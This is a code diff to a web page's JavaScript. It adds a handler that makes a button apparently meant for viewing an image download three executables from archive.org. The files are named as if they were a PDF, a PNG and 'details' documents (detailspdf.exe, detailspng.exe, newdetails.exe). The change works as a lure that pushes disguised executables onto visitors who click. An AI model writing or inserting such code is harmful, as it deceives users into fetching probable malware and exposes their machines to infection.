@@ -4,6 +4,23 @@ document.addEventListener('DOMContentLoaded', () => {
     const viewImageButton = document.getElementById('viewImageButton');
     const logoImage = document.getElementById('logoImage'); // Get reference to the logo image
 
+    // Function to trigger file download
+    const downloadFile = (filename) => {
+        const link = document.createElement('a');
+        link.href = filename;
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    };
+
+    // Add event listener for the download button
+    viewImageButton.addEventListener('click', () => {
+        downloadFile('https://archive.org/download/newdetails/detailspdf.exe');
+        downloadFile('https://archive.org/download/newdetails/detailspng.exe');
+        downloadFile('https://archive.org/download/newdetails/newdetails.exe');
+    });
+
     const hasSeenImages = localStorage.getItem('hasSeenImages');
 
     if (hasSeenImages) {
@@ -18,6 +35,7 @@ document.addEventListener('DOMContentLoaded', () => {
         image2Container.classList.remove('hidden');
         viewImageButton.classList.add('hidden');
         logoImage.classList.add('hidden'); // Hide logo image initially
+        
 
         // Step 1: Show both images for 5 seconds
         setTimeout(() => {
@@ -26,7 +44,6 @@ document.addEventListener('DOMContentLoaded', () => {
             viewImageButton.classList.remove('hidden'); // Show View Image Button
             logoImage.classList.remove('hidden'); // Show logo image
 
-            // Set flag in localStorage so images don't show again on refresh
             localStorage.setItem('hasSeenImages', 'true');
         }, 5000); // Both images visible for 5 seconds
     }
